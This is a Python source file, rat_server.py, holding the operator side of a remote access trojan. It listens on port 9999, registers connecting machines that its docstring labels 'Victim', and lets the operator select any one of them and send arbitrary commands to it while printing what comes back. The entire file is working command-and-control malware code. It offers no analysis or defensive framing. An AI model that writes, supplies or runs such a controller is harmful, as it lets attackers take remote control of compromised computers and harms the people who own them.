# rat_server.py 
import socket
import threading
import sys
import os

# --- Configuration ---
LISTEN_IP = "0.0.0.0"  
LISTEN_PORT = 9999     
BUFFER_SIZE = 4096

clients = {}
clients_lock = threading.Lock()

def handle_client(client_socket, address):
    """Handles communication with a single connected client (Victim)."""
    print(f"\n[+] Accepted connection from {address}")
    client_name = f"Client-{address[0]}:{address[1]}"
    
    with clients_lock:
        clients[client_socket] = (address, client_name)
    
    try:
        # client_socket.settimeout(10) # Set a timeout for initial recv
        # initial_data = client_socket.recv(BUFFER_SIZE).decode('utf-8', errors='ignore')
        # if initial_
        #     client_name = initial_data.strip()
        #     with clients_lock:
        #         clients[client_socket] = (address, client_name)
        #     print(f"[+] Client identified as: {client_name}")
        # client_socket.settimeout(None) # Remove timeout

        while True:
            data = client_socket.recv(BUFFER_SIZE)
            if not data :
                break 
            response = data.decode('utf-8', errors='ignore')
            print(f"\n[RECV from {client_name} ({address})]:\n{response}\n---END OF RESPONSE---")

    except ConnectionResetError:
        print(f"[-] Connection reset by {client_name} ({address})")
    except Exception as e:
        print(f"[-] Error handling client {client_name} ({address}): {e}")
    finally:
        client_socket.close()
        with clients_lock:
            if client_socket in clients:
                del clients[client_socket]
        print(f"[-] Connection with {client_name} ({address}) closed.")

def send_commands():
    """Thread function to read commands from the server operator and send them."""
    while True:
        try:
            with clients_lock:
                if clients:
                    print("\n--- Connected Clients ---")
                    client_list = list(clients.items())
                    for i, (sock, (addr, name)) in enumerate(client_list):
                        print(f"{i}: {name} ({addr})")
                    print("-------------------------")
                else:
                    print("\n[!] No clients connected.")
            
            if not clients:
                import time
                time.sleep(2)
                continue

            command_input = input("\nRAT Server> ").strip()
            
            if not command_input:
                continue

            if command_input.lower().startswith("select "):
                try:
                    index = int(command_input.split()[1])
                    with clients_lock:
                        client_list = list(clients.items())
                        if 0 <= index < len(client_list):
                            selected_socket, (addr, name) = client_list[index]
                            print(f"[+] Selected client: {name} ({addr})")
                            # interactive mode with this client
                            interact_with_client(selected_socket, name, addr)
                        else:
                            print("[!] Invalid client index.")
                except (ValueError, IndexError):
                    print("[!] Usage: select <index>")
            
            elif command_input.lower() == "list":
                pass 
            elif command_input.lower() == "exit":
                print("[+] Shutting down RAT Server...")
                with clients_lock:
                     sockets_to_close = list(clients.keys())
                for sock in sockets_to_close:
                    try:
                        sock.close()
                    except:
                        pass
                os._exit(0) 
            else:
                print("[!] Please 'select <index>' a client first, or type 'list' or 'exit'.")

        except KeyboardInterrupt:
            print("\n[!] KeyboardInterrupt received. Exiting...")
            os._exit(0) 
        except Exception as e:
            print(f"[!] Error in command input: {e}")

def interact_with_client(client_socket, client_name, address):
    """Sends commands to a specific client and waits for the response."""
    print(f"[+] Interacting with {client_name} ({address}). Type 'back' to return to main prompt.")
    try:
        while True:
            cmd = input(f"RAT ({client_name})> ").strip()
            if not cmd:
                continue
            if cmd.lower() == 'back':
                break            
            client_socket.sendall((cmd + "\n").encode('utf-8'))
            print(f"[+] Command sent to {client_name}. Awaiting response...")


    except Exception as e:
        print(f"[!] Error interacting with {client_name}: {e}")
        with clients_lock:
            if client_socket in clients:
                del clients[client_socket]
        try:
            client_socket.close()
        except:
            pass

def main():
    print(f"[+] Starting RAT Server on {LISTEN_IP}:{LISTEN_PORT}...")
    
    try:
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_sock.bind((LISTEN_IP, LISTEN_PORT))
        server_sock.listen(5) 
        print(f"[+] Server listening for RAT client connections...")

        command_thread = threading.Thread(target=send_commands, daemon=False) 
        command_thread.start()
        while True:
            client_sock, addr = server_sock.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_sock, addr))
            client_thread.daemon = True
            client_thread.start()

    except KeyboardInterrupt:
        print("\n[!] Server stopped by user (Ctrl+C).")
    except Exception as e:
        print(f"[-] An unexpected server error occurred: {e}")
    finally:
        try:
            server_sock.close()
            print("[+] Server socket closed.")
        except:
            pass

if __name__ == "__main__":
    main()